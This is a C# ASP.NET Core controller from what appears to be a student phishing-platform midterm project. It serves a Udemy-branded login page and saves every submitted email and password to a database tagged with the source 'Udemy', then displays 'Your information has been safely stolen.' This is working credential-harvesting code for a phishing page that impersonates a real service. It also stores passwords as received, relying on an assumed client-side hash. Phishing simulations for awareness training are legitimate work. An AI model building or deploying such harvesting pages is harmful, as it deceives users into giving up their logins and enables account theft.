using System.Security.Cryptography;
using System.Text;
using Microsoft.AspNetCore.Mvc;
using Phishing_Platform_Midterm.Context;
using Phishing_Platform_Midterm.Entities;

namespace Phishing_Testing_Midterm.Controllers;

public class UdemyController : Controller
{
    private readonly MyDbContext _dataBaseContext;

    public UdemyController(MyDbContext dataBaseContext)
    {
        this._dataBaseContext = dataBaseContext;
    }
    
    public IActionResult Ulogin()
    {
        return View();
    }

    [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> Ulogin(User user)
        {
            if (!ModelState.IsValid)
            {
                foreach (var modelStateKey in ModelState.Keys)
                {
                    var errors = ModelState[modelStateKey].Errors;

                    foreach (var error in errors)
                    {
                        Console.WriteLine($"Key: {modelStateKey}, Error: {error.ErrorMessage}");
                    }
                }
            }
            // Validate the input (add more validation as needed)
            if (string.IsNullOrEmpty(user.Email) || string.IsNullOrEmpty(user.Password))
            {
                TempData["ErrorMessage"] = "Please enter a valid email or phone number.";
                return RedirectToAction("Ulogin");
            }

            try
            {
                // Create a new user instance
                var newUser = new User
                {
                    Email = user.Email,
                    Password = user.Password, // No need to hash the password here, as it's already hashed on the client side
                    Sourcepage = "Udemy",
                    RegistrationDate = DateTime.UtcNow
                };

                // Add the new user to the database
                _dataBaseContext.Users.Add(newUser);
                await _dataBaseContext.SaveChangesAsync();

                // Redirect to a success page or perform other actions
                // For now, redirect to the source page (you might want to adjust this logic)
                TempData["SuccessMessage"] = "Your information has been safely stolen.";
                return RedirectToAction("Ulogin");
            }
            catch (Exception ex)
            {
                // Handle exceptions, log the error, and redirect to an error page
                TempData["ErrorMessage"] = "An error occurred while processing your request.";
                return RedirectToAction("Ulogin");
            }
        }
    
}